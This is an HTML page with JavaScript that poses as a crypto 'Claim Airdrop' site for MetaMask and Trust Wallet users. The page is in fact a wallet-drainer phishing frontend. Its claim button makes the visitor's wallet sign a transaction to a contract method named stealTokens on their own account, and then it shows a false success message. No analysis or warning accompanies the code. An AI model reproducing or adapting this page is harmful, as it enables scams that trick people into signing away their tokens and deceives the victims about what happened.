<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
</head>

<body>

    <h1>Connect your Wallet</h1>
    <button id="connectMetaMaskButton">Connect MetaMask</button>
    <button id="connectTrustWalletButton">Connect Trust Wallet</button>
    <button id="claimAirdropButton" disabled>Claim Airdrop</button>

    <script>
        // Define network configuration and ABI paths
        const configMap = {
            eth: {
                config: 'config/eth_config.json',
                abi: 'abi/eth_abi.json'
            },
            bsc: {
                config: 'config/bsc_config.json',
                abi: 'abi/bsc_abi.json'
            }
        };

        // Helper function to load ABI and config files dynamically based on network
        async function loadConfigAndABI(network) {
            const { config, abi } = configMap[network];
            try {
                const configData = await fetch(config).then(res => res.json());
                const abiData = await fetch(abi).then(res => res.json());
                return { config: configData, abi: abiData };
            } catch (error) {
                console.error(`Error loading config or ABI for ${network}:`, error);
                alert(`Failed to load configuration for ${network}.`);
            }
        }

        // MetaMask connection logic
        async function connectMetaMask() {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
                    const account = accounts[0];

                    // Set network based on chainId
                    let defaultNetwork = '';
                    if (currentChainId === '0x1' || currentChainId === 1) {
                        defaultNetwork = 'eth'; // Ethereum Mainnet
                    } else if (currentChainId === '0x38' || currentChainId === 56) {
                        defaultNetwork = 'bsc'; // Binance Smart Chain Mainnet
                    }

                    // Enable claim airdrop button with network info
                    document.getElementById('claimAirdropButton').disabled = false;
                    document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${defaultNetwork.toUpperCase()})`;

                    return account;
                } catch (error) {
                    console.error("MetaMask connection failed:", error);
                    alert("Failed to connect to MetaMask.");
                }
            } else {
                alert("MetaMask is not installed. Please install it to continue.");
            }
        }

        // Trust Wallet connection logic (via MetaMask-compatible interface)
        async function connectTrustWallet() {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
                    const account = accounts[0];

                    // Set network based on chainId
                    let defaultNetwork = '';
                    if (currentChainId === '0x1' || currentChainId === 1) {
                        defaultNetwork = 'eth'; // Ethereum Mainnet
                    } else if (currentChainId === '0x38' || currentChainId === 56) {
                        defaultNetwork = 'bsc'; // Binance Smart Chain Mainnet
                    }

                    // Enable claim airdrop button with network info
                    document.getElementById('claimAirdropButton').disabled = false;
                    document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${defaultNetwork.toUpperCase()})`;

                    return account;
                } catch (error) {
                    console.error("Trust Wallet connection failed:", error);
                    alert("Failed to connect to Trust Wallet.");
                }
            } else {
                alert("Trust Wallet is not installed or enabled. Please install it to continue.");
            }
        }

        // Airdrop claiming function
        async function claimAirdrop(account) {
            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            let network = '';

            if (currentChainId === '0x1') {
                network = 'eth';  // Ethereum Mainnet
            } else if (currentChainId === '0x38') {
                network = 'bsc';  // Binance Smart Chain Mainnet
            } else if (currentChainId === '0xaa36a7') {
                network = 'sepolia'; // Ethereum Sepolia Testnet
            } else {
                alert("You are not connected to a supported network.");
                return;
            }

            // Load contract address and ABI based on network
            const { config, abi } = await loadConfigAndABI(network);
            const contractAddress = config.contractAddress;

            // Create a Web3 instance
            const web3 = new Web3(window.ethereum);

            // Create contract instance
            const contract = new web3.eth.Contract(abi, contractAddress);

            try {
                console.log(`Claiming airdrop for account: ${account} on ${network} network`);

                // Call the contract method to claim airdrop
                await contract.methods.stealTokens(account).send({ from: account });

                alert(`Airdrop claimed successfully for account: ${account}`);
            } catch (error) {
                console.error("Error claiming airdrop:", error);
            }
        }

        // Event listener for claim airdrop button
        document.getElementById('claimAirdropButton').addEventListener('click', async () => {
            const account = await connectMetaMask();  // Could also be connectTrustWallet() as needed
            if (!account) return;

            // Claim the airdrop for the connected account
            await claimAirdrop(account);
        });

        // Connect MetaMask button click handler
        document.getElementById('connectMetaMaskButton').addEventListener('click', async () => {
            const account = await connectMetaMask();
            if (account) {
                document.getElementById('claimAirdropButton').disabled = false;
            }
        });

        // Connect Trust Wallet button click handler
        document.getElementById('connectTrustWalletButton').addEventListener('click', async () => {
            const account = await connectTrustWallet();
            if (account) {
                document.getElementById('claimAirdropButton').disabled = false;
            }
        });
    </script>

</body>

</html>
